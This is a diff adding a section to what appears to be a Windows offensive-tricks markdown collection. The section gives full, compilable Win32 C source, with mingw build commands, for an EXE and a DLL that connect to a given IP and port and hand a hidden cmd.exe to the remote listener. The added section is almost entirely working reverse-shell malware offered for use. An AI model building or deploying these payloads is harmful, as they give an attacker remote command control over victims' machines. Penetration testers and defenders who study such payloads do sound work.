@@ -2402,3 +2402,128 @@ for($i = 0; $i -lt 3; $i++)
 **The alert will look like this**
 
 ![alt text](https://github.com/billchaison/Windows-Trix/blob/master/pop0.png)
+
+## >> Reverse shell binaries using Win32 C
+
+Example EXE `rvshexe.exe` and DLL `rvshdll.dll` payloads that provide cmd.exe reverse shells.
+
+**Compiling an EXE**
+
+```c
+// x86_64-w64-mingw32-gcc -m64 -static rvshexe.c -o rvshexe.exe -lws2_32
+
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+
+WSADATA wsaData;
+SOCKET sock;
+struct sockaddr_in sai;
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+char *ip;
+char *port;
+
+int main(int argc, char* argv[])
+{
+    if(argc != 3)
+    {
+        printf("You must provide the IP address and port of the netcat listener.\n");
+        return -1;
+    }
+    ip = argv[1];
+    port = argv[2];
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if(sock == INVALID_SOCKET)
+    {
+        printf("Error in WSASocket, %d.\n", WSAGetLastError());
+        return -1;
+    }
+    sai.sin_family = AF_INET;
+    sai.sin_port = htons(atoi(port));
+    sai.sin_addr.s_addr = inet_addr(ip);
+    if(WSAConnect(sock, (SOCKADDR*)&sai, sizeof(sai), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+    {
+        printf("Error in WSAConnect, %d.\n", WSAGetLastError());
+        return -1;
+    }
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = (STARTF_USESTDHANDLES);
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+    if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        printf("Error in CreateProcess, %d.\n", GetLastError());
+        return -1;
+    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    return 0;
+}
+```
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh01.png)
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh02.png)
+
+```c
+// x86_64-w64-mingw32-gcc -m64 -shared -Wl,--kill-at rvshdll.c -o rvshdll.dll -lws2_32
+
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+void CALLBACK Remote(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
+
+void CALLBACK Remote(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in sai;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    char ip[200];
+    char port[200];
+    char *tok;
+
+    tok = strtok(lpszCmdLine, " ");
+    if(strlen(tok) == 0 || strlen(tok) > 15)
+    {
+        return;
+    }
+    strcpy(ip, tok);
+    tok = strtok(NULL, " ");
+    if(strlen(tok) == 0 || strlen(tok) > 5)
+    {
+        return;
+    }
+    strcpy(port, tok);
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if(sock == INVALID_SOCKET)
+    {
+        return;
+    }
+    sai.sin_family = AF_INET;
+    sai.sin_port = htons(atoi(port));
+    sai.sin_addr.s_addr = inet_addr(ip);
+    if(WSAConnect(sock, (SOCKADDR*)&sai, sizeof(sai), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+    {
+        return;
+    }
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = (STARTF_USESTDHANDLES);
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+    if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        return;
+    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+}
+```
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh03.png)
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh04.png)
